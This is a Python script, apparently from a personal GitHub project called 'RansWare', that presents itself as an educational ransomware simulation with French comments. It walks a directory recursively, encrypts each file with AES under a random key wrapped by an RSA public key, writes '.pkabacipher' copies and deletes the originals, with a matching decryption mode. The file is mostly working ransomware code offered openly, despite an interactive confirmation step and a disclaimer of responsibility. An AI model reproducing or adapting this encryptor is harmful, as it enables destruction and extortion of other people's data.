"""
Coded By Alexis Pondo
Github: http://github.com/alexispondo/
Linkedin: https://www.linkedin.com/in/alexis-pondo/

Note: Ce programe est destiné à but éducatif, en effet il a été écrit pour comprendre le fonctionnement des ransomware, comment le chiffrement sous-jacent fonctionne et comment il se propage sur une machine.
      Je ne suis en aucun cas reponsable de tous ce que vous ferez avec.

Usage:
    python3 RansWare.py gen_key
    python3 RansWare.py enc --dir "/home/alexispondo/Téléchargements/bibliothequePHP-master (copie 1)" --pub_key /home/alexispondo/HACK_LOG/PERSO/ransomware/public
    python3 RansWare.py dec --dir "/home/alexispondo/Téléchargements/bibliothequePHP-master (copie 1)" --priv_key /home/alexispondo/HACK_LOG/PERSO/ransomware/private --mdp /home/alexispondo/HACK_LOG/PERSO/ransomware/password

Attention !!!:
    Il ne sert à rien de chiffrer un fichier plusieurs fois (ex: evitez les chiffrement du genre: text.pkabacipher.pkabacipher)
    Une erreur pourrais apparaitre lors du deuxième dechiffrement !!!
"""

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os
import random

import argparse
from termcolor import cprint


print_blue = lambda x: cprint(x, 'blue')
print_red = lambda x: cprint(x, "red")
print_green =  lambda x: cprint(x, "green")
print_yellow = lambda x: cprint(x, "yellow")
print_yellow_bold = lambda x: cprint(x, "yellow", attrs=['bold'])
print_red_bold = lambda x: cprint(x, "red", attrs=['bold'])


def banner():
    infos = """
    [+] Name: RansWare
    [+] Version: 1.0
    [+] Github: https://github.com/alexispondo/RansWare
    [+] Linkedin: https://www.linkedin.com/in/alexis-pondo/
    """
    var1 = """
 ██▀███   ▄▄▄       ███▄    █   ██████  █     █░ ▄▄▄       ██▀███  ▓█████ 
▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
  ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░    ░   ░    ░   ▒     ░░   ░    ░   
   ░           ░  ░         ░       ░      ░          ░  ░   ░        ░  ░
"""+infos+"""
    """

    var2 = """
 ______     ______     __   __     ______     __     __     ______     ______     ______    
/\  == \   /\  __ \   /\ "-.\ \   /\  ___\   /\ \  _ \ \   /\  __ \   /\  == \   /\  ___\   
\ \  __<   \ \  __ \  \ \ \-.  \  \ \___  \  \ \ \/ ".\ \  \ \  __ \  \ \  __<   \ \  __\   
 \ \_\ \_\  \ \_\ \_\  \ \_\\"\_\  \/\_____\  \ \__/".~\_\  \ \_\ \_\  \ \_\ \_\  \ \_____\ 
  \/_/ /_/   \/_/\/_/   \/_/ \/_/   \/_____/   \/_/   \/_/   \/_/\/_/   \/_/ /_/   \/_____/ 
                                                                                            
"""+infos+"""
    """

    var3 = """
 .S_sSSs     .S_SSSs     .S_sSSs      sSSs   .S     S.    .S_SSSs     .S_sSSs      sSSs  
.SS~YS%%b   .SS~SSSSS   .SS~YS%%b    d%%SP  .SS     SS.  .SS~SSSSS   .SS~YS%%b    d%%SP  
S%S   `S%b  S%S   SSSS  S%S   `S%b  d%S'    S%S     S%S  S%S   SSSS  S%S   `S%b  d%S'    
S%S    S%S  S%S    S%S  S%S    S%S  S%|     S%S     S%S  S%S    S%S  S%S    S%S  S%S     
S%S    d*S  S%S SSSS%S  S%S    S&S  S&S     S%S     S%S  S%S SSSS%S  S%S    d*S  S&S     
S&S   .S*S  S&S  SSS%S  S&S    S&S  Y&Ss    S&S     S&S  S&S  SSS%S  S&S   .S*S  S&S_Ss  
S&S_sdSSS   S&S    S&S  S&S    S&S  `S&&S   S&S     S&S  S&S    S&S  S&S_sdSSS   S&S~SP  
S&S~YSY%b   S&S    S&S  S&S    S&S    `S*S  S&S     S&S  S&S    S&S  S&S~YSY%b   S&S     
S*S   `S%b  S*S    S&S  S*S    S*S     l*S  S*S     S*S  S*S    S&S  S*S   `S%b  S*b     
S*S    S%S  S*S    S*S  S*S    S*S    .S*P  S*S  .  S*S  S*S    S*S  S*S    S%S  S*S.    
S*S    S&S  S*S    S*S  S*S    S*S  sSS*S   S*S_sSs_S*S  S*S    S*S  S*S    S&S   SSSbs  
S*S    SSS  SSS    S*S  S*S    SSS  YSS'    SSS~SSS~S*S  SSS    S*S  S*S    SSS    YSSP  
SP                 SP   SP                                      SP   SP                  
Y                  Y    Y                                       Y    Y                   
    
"""+infos+"""
    """
    return random.choice([var1, var2, var3])

# convertir du byte en hexadecimal
def bytes_to_hex(b):
    return b.hex()

# convertir de l'hexa en bytes
def hex_to_bytes(h):
    return bytes.fromhex(h)



#############################################################################################################################
################################################## Symetric Cryptography ####################################################
#############################################################################################################################

# Fonction de generation de mot de passe pour le chiffrement symetrique
def gen_passw():
    key = os.urandom(32) #password
    return key #password

# Fonction de generation de vecteur d'initialisation
def gen_init_vector():
    iv = os.urandom(16) # initialization vector
    return iv # initialization_vector


# Fonction permettant de savoir si la longueur du message est un multiple de la longueur des blocs (longueur du vecteur d'init (iv) car il est le premier bloc)
# Cette fonction prend en paramètre le vecteur d'initialisation (iv) et message à chiffrer (data)
def make_mult_iv(iv, data):
    if len(data) < len(iv): # On verifie si la longueur du message est inferieur à la longueur du vecteur d'initialisation
        rest = len(iv) - len(data) # Dans ce cas le nombre de caractère à ajouter pour avoir la multiplicité est égale à la soustraction len(iv) - len(data)
    else:
        rest = len(data) % len(iv) # Dans le cas contraire on determine le reste de la division: len(data) % len(iv)

    if rest == 0: # On verifie si la longueur du message est égale à la longueur du vecteur d'initialisation
        return data # Dans ce cas on retourne le message tel qu'il est
    else: # Dans le cas contraire
        # On ajoute un nombre "@" equivalent à la longueur de iv pour permetre de savoir si un ajout à été fait lors du decryptage
        # (le nombre "@" est equivalent à la longueur de "iv" pour s'assurer que la multiplicité est toujours respecté)
        # on utilise b"" car on attend des données en bytes
        delimiteur = b"" # Initialise le delimiteur
        for k in range(len(iv)):
            delimiteur = delimiteur + b"@" # on ajoute les caractères

        # Cette boucle permet d'ajouter un nombre de caractère "$" égale à la soustraction entre la longueur de iv et le reste de la division de len(data) par len(iv) toujours dans le but de s'assurer de la multiplicité
        nbr_lettre_a_ajouter = len(iv) - rest #Nombre de lettre à ajouter
        reste_letter = b"" # Initialise le reste letter
        for i in range(nbr_lettre_a_ajouter):
            reste_letter = reste_letter + b"$" # on ajoute les caractères
        return data + delimiteur + reste_letter # on retourne un message contenant le message initiale, le delimiteur et des caractères ajoutés pour s'assurer de la multiplicité


# Permet de recupérer le message d'origine
def get_original_data(iv, data):
    delimiter = b"" # Initialise le delimiteur
    for i in range(len(iv)):
        delimiter = delimiter + b"@" # on ajoute les caractères

    a = delimiter.join(data.split(delimiter)[:-1]) # On utilise "delimiter.join(data.split(delimiter)[0])" au lieu "data.split(delimiter)[0]" pour s'assurer que même si un delimiteur existait dans le texte d'origine on le prenne toujours en compte
    return a # On retourne le message original

"""# Pour le debug
def ch_test(key_mdp, init_v, data):
    cipher = Cipher(
        algorithms.AES(key_mdp),
        modes.CBC(init_v)
    )
    data = make_mult_iv(init_v, data)
    data_crypte = cipher.encryptor().update(data) + cipher.encryptor().finalize()
    return data_crypte

def dech_test(key_mdp, init_v, data):
    cipher = Cipher(
        algorithms.AES(key_mdp),
        modes.CBC(init_v)
    )
    plaintext_file = cipher.decryptor().update(data) + cipher.decryptor().finalize()
    data = get_original_data(init_v,plaintext_file)
    return data
"""

# Fonction de chiffrement symetrique il prend en paramètre le fichier à chiffrer, la clé publique pour chiffrer de façon assymetrique le password du chiffrement symetrique et le password en question
def sym_cipher_data(file, public_key, key_mdp):

    # vecteur d'initialisation
    init_v = gen_init_vector()

    # On crée notre chiffreur :)
    cipher = Cipher(
        algorithms.AES(key_mdp),
        modes.CBC(init_v)
    )

    # On charge notre clé publique pour la rendre utilisable (deserialisation)
    pub_k = load_public_key(public_key)

    # On chiffre asymetriquement le password avec la clé publique
    ciphertext_pass = pub_k.encrypt(
        key_mdp,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # On récupère l'information à chiffrer
    with open(file, "rb") as f:
        data = f.read()
        data = make_mult_iv(init_v, data) # On verifie la multiplicité entre la longueur du message et celle du vecteur d'initialisation (en retourne un message dont la longueur est multiple de la longueur du iv)

    # On crypte la donnée recupérée à l'aide de notre chiffreur
    data_crypte = cipher.encryptor().update(data) + cipher.encryptor().finalize()

    # on ajoute le vecteur d'initialisation et le mot de passe chiffré au fichier
    # on transforme les bytes en hexadecimale
    data_and_init_vector = bytes_to_hex(data_crypte) + "pkabacipher" + bytes_to_hex(init_v) + "pkabacipher" + bytes_to_hex(ciphertext_pass)

    # On sauvegarde l'information chiffré dans un fichier portant le même nom en y ajoutant l'extention ".pkabacipher"
    new_file = file + ".pkabacipher"
    with open(new_file, "w") as nf:
        nf.write(data_and_init_vector)

    # On suprime l'ancien fichier
    os.remove(file)

# Fonction de dechiffrement symetrique il prend en paramètre le fichier chiffré et la clé privée
def sym_decipher_data(file_cipher, private_key):

    # On charge la clé privée
    priv_k = load_private_key(private_key)

    # On ouvre le fichier chiffré symetriquement contenant en son sein le vecteur d'initialisation et le mdp chiffré
    with open(file_cipher, "r") as f:
        file_and_init = f.read()


    # On recupère chaque partie du fichier chiffré
    file = hex_to_bytes(file_and_init.split("pkabacipher")[0]) # Le contenu du fichier chiffré
    plaintext_iv = hex_to_bytes(file_and_init.split("pkabacipher")[1]) # Le vecteur d'initialisation pour dechiffer ce fichier
    key = hex_to_bytes(file_and_init.split("pkabacipher")[2]) # Le mot de passe pour dechiffrer ce fichier

    # On dechiffre le mot de passe
    plaintext_key = priv_k.decrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    #######################################################################


    # On crèe notre dechiffreur
    cipher = Cipher(
        algorithms.AES(plaintext_key),
        modes.CBC(plaintext_iv)
    )

    # On decrypte les données récupérés à l'aide de notre dechiffreur (:
    plaintext_file = cipher.decryptor().update(file)+cipher.decryptor().finalize()

    #On recupère le message original
    plaintext_file = get_original_data(plaintext_iv, plaintext_file)

    # On sauvegarde l'information dechiffré dans un fichier portant le nom initial i.e en supprimant l'extention ".pkabacipher"
    new_file = ".".join(str(file_cipher).split(".")[:-1])
    with open(new_file, "wb") as nf:
        nf.write(plaintext_file)

    # On supprime le fichier chiffré
    os.remove(file_cipher)

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################







#############################################################################################################################
################################################# Asymetric Cryptography ###################################################
#############################################################################################################################

# On genère une clé privé/publique de taille "size"
def generer_private_key(size = 2048):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=int(size),
    )
    return private_key

# Fonction permettant de charger une clé privée (la deserialiser)
def load_private_key(private_key_file):
    with open(private_key_file, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            #password=b'mypassword',
            password=None,
        )
    return private_key

# Fonction permettant de serialiser une clé privée (l'enregistrer dans un fichier)
def serialize_private_key(private_key, output):
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        #encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword')
        encryption_algorithm=serialization.NoEncryption()
    )
    with open(output, "wb") as private_key:
        private_key.write(pem)

# Fonction permettant d'extraire la clé plublique de la clé privée/publique
def get_public_key(private_key):
    public_key = private_key.public_key()
    return public_key

# Fonction permettant de serialiser une clé publique (l'enregistrer dans un fichier)
def serialize_public_key(public_key, output):
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    with open(output, "wb") as public_key:
        public_key.write(pem)

# Fonction permettant de charger une clé publique (la deserialiser)
def load_public_key(public_key_file):
    with open(public_key_file, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read()
        )
    return public_key

# Fonction de chiffrement asymetrique prenant en paramètre la clé publique et le fichier à chiffrer (Fonction non utilisé)
def ch(public_key, file):
    with open(file, "rb") as f:
        message = f.read()
    ciphertext = public_key.encrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    new_file = file + ".pkabacipher"
    with open(new_file, "wb") as nf:
        nf.write(ciphertext)
    os.remove(file)

# Fonction de dechiffrement asymetrique prenant en paramètre la clé privée et le fichier à dechiffrer (Fonction non utilisé)
def dech(private_key, file):
    with open(file, "rb") as f:
        ciphertext = f.read()
    plaintext = private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    new_file = "".join(str(file).split(".")[:-1])
    with open(new_file, "wb") as nf:
        nf.write(plaintext)
    os.remove(file)

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################

def crypter(dir, public_key_file, mdp):
    if os.path.isdir(dir): # Le dossier exist-il ?
        for (current_dir, list_dir, files) in os.walk(dir): # Si OUI on liste les dossiers et fichiers contenus dans le dossier courant
            for f in files:
                path_file = current_dir + "/" + f
                print(path_file) # On affiche les fichiers
        print("\nLes fichiers Listés seront crypté voulez vous continuer ?")
        continuer = str(input("O/N >> ")) # Demande pour continuer
        if continuer.lower() == "o": # Si oui
            print("\nDebut du chiffrement...\n")
            for (current_dir, list_dir, files) in os.walk(dir): # On liste les dossiers et fichiers contenus dans le dossier courant
                for f in files:
                    path_file = current_dir + "/" + f
                    print_blue("Ancien = {}".format(path_file))
                    try:
                        sym_cipher_data(path_file, public_key_file, mdp) # On chiffre les fichiers
                        path_file_c = path_file + ".pkabacipher"
                        print_green("Nouveau = {}".format(path_file_c))
                    except Exception as e:
                        print(e)
            print("\nFin du chiffrement...")
        else:
            print("\nChiffrement annulé...")
    else:
        print("\nDésolé vous avez entrez un dossier inexistant :(")

def decrypter(dir, private_key_file):#, mdp):
    if os.path.isdir(dir): # Le dossier exist-il ?
        for (current_dir, list_dir, files) in os.walk(dir): # Si OUI on liste les dossiers et fichiers contenus dans le dossier courant
            for f in files:
                path_file = current_dir + "/" + f
                print(path_file) # On affiche les fichiers
        print("\nLes fichiers Listés seront decrypté (assurez vous d'avoir l'extention \".pkabacipher\" avant de les dechiffrer. voulez vous continuer ?")
        continuer = str(input("O/N >> ")) # Demande pour continuer
        if continuer.lower() == "o": # Si OUI
            print("\nDebut du dechiffrement...\n")
            for (current_dir, list_dir, files) in os.walk(dir): # On liste les dossiers et fichiers contenus dans le dossier courant
                for f in files:
                    path_file = current_dir + "/" + f
                    print_blue("Ancien = {}".format(path_file))
                    try:
                        sym_decipher_data(path_file, private_key_file) # On dechiffre les fichiers
                        path_file_c = ".".join(str(path_file).split(".")[:-1])
                        print_green("Nouveau = {}".format(path_file_c))
                    except Exception as e:
                        print(e)
            print("\nFin du dechiffrement...")
        else:
            print("\nDechiffrement annulé...")
    else:
        print("\nDésolé vous avez entrez un dossier inexistant :(")


parser = argparse.ArgumentParser(description="Systeme de chiffrement/dechiffrement de fichier simulant un ransonware")
subparser = parser.add_subparsers(dest='command')

gen_key = subparser.add_parser('gen_key',help="Générer une paire de clé: (clé privée / clé publique)") # Choisir de générer une paire de clé privée/publique
enc = subparser.add_parser('enc', help="Crypter les fichiers d'un repertoire de façon recursive") # Choisir de faire le chiffrement
dec = subparser.add_parser('dec', help="Décrypter les fichiers d'un repertoire de façon recursive") # Choisir de faire le dechifrement

enc.add_argument("--dir", type=str, required=True, help="Spécifier le chemin du repertoire à partir duquel commencer le cryptage") # Spécifier le dossier racine de chiffrement
enc.add_argument("--pub_key", type=str, required=True, help="Spécifier le chemin de la clé publique l'ors du cryptage") # Spécifier la clé publique pour le chiffrement

dec.add_argument("--dir", type=str, required=True, help="Spécifier le chemin du repertoire à partir duquel commencer le decryptage") # Spécifier le dossier racine de dechiffrement
dec.add_argument("--priv_key", type=str, required=True, help="Spécifier le chemin de la clé privée l'ors du decryptage") # Spécifier la clé privée pour le dechiffrement
#dec.add_argument("--mdp", type=str, required=True, help="Spécifier le chemin du fichier de mot de passe l'ors du decryptage") # Spécifier le fichier de mot de passe pour le dechiffrement

args = parser.parse_args()
print_yellow_bold(banner())
if args.command == 'gen_key':
    print('Génération des clés...')

    serialize_private_key(generer_private_key(4096),"private")
    print("\nClé Privée: {}".format(os.getcwd() + "/private"))
    print("####################################################################################")
    with open("private", "r") as pri:
        print(pri.read())
    print("####################################################################################")


    serialize_public_key(get_public_key(load_private_key("private")),"public")
    print("\nClé Publique: {}".format(os.getcwd() + "/public"))
    print("####################################################################################")
    with open("public", "r") as pub:
        print(pub.read())
    print("####################################################################################")

    print("\n==== La paire de clé a été générée ==== \nGénération terminé... ")

elif args.command == 'enc':
    dir = args.dir
    pub_key = args.pub_key
    mdp = gen_passw()  # On genere notre password aleatoirement pour le chiffrement symetrique
    crypter(dir, pub_key, mdp)
elif args.command == 'dec':
    dir = args.dir
    priv_key = args.priv_key
    decrypter(dir,priv_key)